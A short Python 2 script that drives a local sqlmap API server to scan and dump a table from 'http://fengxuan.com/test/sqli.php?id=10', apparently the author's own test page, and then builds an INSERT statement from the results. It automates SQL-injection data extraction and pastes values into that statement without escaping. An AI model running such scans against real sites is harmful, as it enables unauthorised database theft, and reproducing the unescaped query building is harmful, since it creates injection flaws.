#!/usr/bin/env python
#!/usr/bin/env python
#!-*- coding: utf-8 -*-

import requests
import json

taskid = "b96b02a777182ec5"
server = "http://127.0.0.1:8775/"
headers = {'Content-Type': 'application/json'}

def scan_start(payload):    
    #需要扫描的地址
    url = server + 'scan/' + taskid + '/start'
    #http://127.0.0.1:8557/scan/xxxxxxxxxx/start
    t = json.loads(
        requests.post(url, data=json.dumps(payload), headers=headers).text)
    engineid = t['engineid']
    if len(str(engineid)) > 0 and t['success']:
        print 'Started scan'
        return True
    return False

def getresult():
    url = server + 'scan/' + taskid + '/data'
    result=  json.loads(requests.get(url, headers=headers).text)
    data = result['data'][1]['value']
    columns = []
    sql = "insert into table("
    for line in data:
        if line == "__infos__" or line =='id':
            continue
        columns.append(line)
        sql += "{0},".format(line)

    sql = "{0}) values(".format(sql[:-1])
    # print sql
    row = data[columns[0]]['values']
    
    for pos in range(len(row)):
        for col in columns:
            sql += "\"{0}\",".format(data[col]['values'][pos])
        sql = "{0})".format(sql[:-1])
        break
    print sql
    # for line in result['data'][1]['value']:
    #     print result['data'][1]['value'][line.encode('utf-8', 'ignore')]

def main():
    payload = {"api":True, "url":"http://fengxuan.com/test/sqli.php?id=10", "disableColoring": True ,
    "dumpFormat": "CSV", "dumpTable":True,"batch": True}
    # scan_start(payload)
    getresult()

if __name__ == '__main__':
    main()


